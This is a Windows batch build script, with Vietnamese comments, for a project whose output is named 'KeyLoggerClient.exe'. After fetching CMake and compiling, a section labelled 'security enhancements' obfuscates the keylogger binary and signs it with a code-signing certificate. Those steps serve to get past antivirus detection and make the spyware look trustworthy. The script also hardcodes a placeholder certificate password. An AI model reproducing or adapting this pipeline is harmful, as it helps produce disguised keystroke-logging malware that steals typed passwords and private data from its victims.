@echo off
setlocal enabledelayedexpansion

:: ================================
:: Config
:: ================================
set BUILD_DIR=%~dp0..\build
set DIST_DIR=%~dp0..\dist
set SRC_DIR=%~dp0..
set TOOLS_DIR=%~dp0..\tools
set CMAKE_VERSION=4.1.0
set CMAKE_ZIP=cmake-%CMAKE_VERSION%-windows-x86_64.zip
set CMAKE_URL=https://github.com/Kitware/CMake/releases/download/v%CMAKE_VERSION%/%CMAKE_ZIP%
set CMAKE_DIR=%TOOLS_DIR%\cmake-%CMAKE_VERSION%-windows-x86_64

:: Zip CMake đặt sẵn trong root project
set LOCAL_CMAKE_ZIP=%SRC_DIR%\cmake-%CMAKE_VERSION%.zip

:: Security tools config
set OBFUSCATOR=%TOOLS_DIR%\obfuscator.exe
set SIGNTOOL=%ProgramFiles(x86)%\Windows Kits\10\bin\x64\signtool.exe
set CERT_FILE=%TOOLS_DIR%\code_signing.pfx
set CERT_PASSWORD=YourPasswordHere
set INPUT_FILE=%DIST_DIR%\KeyLoggerClient.exe
set OUTPUT_FILE=%DIST_DIR%\KeyLoggerClient_protected.exe

:: ================================
:: Tạo thư mục cần thiết
:: ================================
echo [INFO] Checking and creating directories...
if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
if not exist "%DIST_DIR%" mkdir "%DIST_DIR%"
if not exist "%TOOLS_DIR%" mkdir "%TOOLS_DIR%"

:: ================================
:: Kiểm tra CMake
:: ================================
echo [INFO] Checking CMake installation...
where cmake >nul 2>nul
if %errorlevel% equ 0 (
    echo [INFO] CMake found in PATH.
    goto :build
)

echo [INFO] CMake not found in PATH. Checking local copy...
if exist "%CMAKE_DIR%\bin\cmake.exe" (
    echo [INFO] Local CMake found. Adding to PATH...
    set "PATH=%CMAKE_DIR%\bin;%PATH%"
    goto :build
)

:: ================================
:: Ưu tiên dùng file zip CMake đặt sẵn trong dự án
:: ================================
if exist "%LOCAL_CMAKE_ZIP%" (
    echo [INFO] Found pre-downloaded CMake archive: %LOCAL_CMAKE_ZIP%
    
    :: Try PowerShell first, fallback to other methods
    powershell.exe -Command "Expand-Archive '%LOCAL_CMAKE_ZIP%' -DestinationPath '%TOOLS_DIR%' -Force" 2>nul
    if !errorlevel! equ 0 (
        echo [INFO] CMake extracted successfully using PowerShell
        set "PATH=%CMAKE_DIR%\bin;%PATH%"
        goto :build
    )
    
    :: Try using tar (available in newer Windows versions and Git Bash)
    echo [INFO] PowerShell failed, trying tar...
    tar -xf "%LOCAL_CMAKE_ZIP%" -C "%TOOLS_DIR%"
    if !errorlevel! equ 0 (
        echo [INFO] CMake extracted successfully using tar
        set "PATH=%CMAKE_DIR%\bin;%PATH%"
        goto :build
    )
    
    :: Try using 7zip if available
    echo [INFO] tar failed, trying 7zip...
    if exist "%ProgramFiles%\7-Zip\7z.exe" (
        "%ProgramFiles%\7-Zip\7z.exe" x "%LOCAL_CMAKE_ZIP%" -o"%TOOLS_DIR%" -y
        if !errorlevel! equ 0 (
            echo [INFO] CMake extracted successfully using 7zip
            set "PATH=%CMAKE_DIR%\bin;%PATH%"
            goto :build
        )
    )
    
    echo [ERROR] Failed to extract CMake zip with all available methods
    echo [INFO] Please extract %LOCAL_CMAKE_ZIP% manually to %TOOLS_DIR%
    exit /b 1
)

:: ================================
:: Nếu không có thì tải từ GitHub
:: ================================
echo [INFO] Downloading CMake %CMAKE_VERSION%...

:: Try curl first (available in newer Windows and Git Bash)
curl -L "%CMAKE_URL%" -o "%TOOLS_DIR%\%CMAKE_ZIP%"
if !errorlevel! neq 0 (
    :: Fallback to PowerShell if curl fails
    powershell.exe -Command "Invoke-WebRequest '%CMAKE_URL%' -OutFile '%TOOLS_DIR%\%CMAKE_ZIP%'"
    if !errorlevel! neq 0 (
        echo [ERROR] Failed to download CMake
        echo [INFO] Please download manually: https://cmake.org/download/
        exit /b 1
    )
)

echo [INFO] Extracting CMake...
:: Use the same extraction logic as above
tar -xf "%TOOLS_DIR%\%CMAKE_ZIP%" -C "%TOOLS_DIR%"
if !errorlevel! neq 0 (
    powershell.exe -Command "Expand-Archive '%TOOLS_DIR%\%CMAKE_ZIP%' -DestinationPath '%TOOLS_DIR%' -Force"
    if !errorlevel! neq 0 (
        echo [ERROR] Failed to extract CMake
        exit /b 1
    )
)

set "PATH=%CMAKE_DIR%\bin;%PATH%"

:: ================================
:: Build Project
:: ================================
:build
echo [INFO] Configuring build...
cd "%BUILD_DIR%"
cmake -G "Visual Studio 16 2019" -A x64 ^
      -DCMAKE_BUILD_TYPE=Release ^
      -DCMAKE_RUNTIME_OUTPUT_DIRECTORY="%DIST_DIR%" ^
      -DCMAKE_LIBRARY_OUTPUT_DIRECTORY="%DIST_DIR%" ^
      -DCMAKE_ARCHIVE_OUTPUT_DIRECTORY="%DIST_DIR%" ^
      "%SRC_DIR%"

if %errorlevel% neq 0 (
    echo [ERROR] CMake configuration failed
    exit /b 1
)

echo [INFO] Building project...
cmake --build . --config Release --target ALL_BUILD -j 8
if %errorlevel% neq 0 (
    echo [ERROR] Build failed
    exit /b 1
)

:: ================================
:: Add additional security steps
:: ================================
echo [INFO] Applying security enhancements...

:: Obfuscate the binary
if exist "%OBFUSCATOR%" (
    "%OBFUSCATOR%" "%INPUT_FILE%" "%OUTPUT_FILE%"
    if !errorlevel! equ 0 (
        echo [INFO] Binary obfuscation completed
    ) else (
        echo [WARNING] Obfuscation failed, using original binary
        copy "%INPUT_FILE%" "%OUTPUT_FILE%"
    )
) else (
    echo [WARNING] Obfuscator not found, skipping obfuscation
    copy "%INPUT_FILE%" "%OUTPUT_FILE%"
)

:: Add digital signature
if exist "%SIGNTOOL%" (
    "%SIGNTOOL%" sign /f "%CERT_FILE%" /p "%CERT_PASSWORD%" "%OUTPUT_FILE%"
    if !errorlevel! equ 0 (
        echo [INFO] Binary signed successfully
    ) else (
        echo [WARNING] Code signing failed
    )
) else (
    echo [WARNING] SignTool not found, skipping code signing
)

:: Verify final binary
if exist "%OUTPUT_FILE%" (
    echo [SUCCESS] Final binary created: %OUTPUT_FILE%
    dir "%OUTPUT_FILE%"
) else (
    echo [ERROR] Final binary was not created
    exit /b 1
)

endlocal
exit /b 0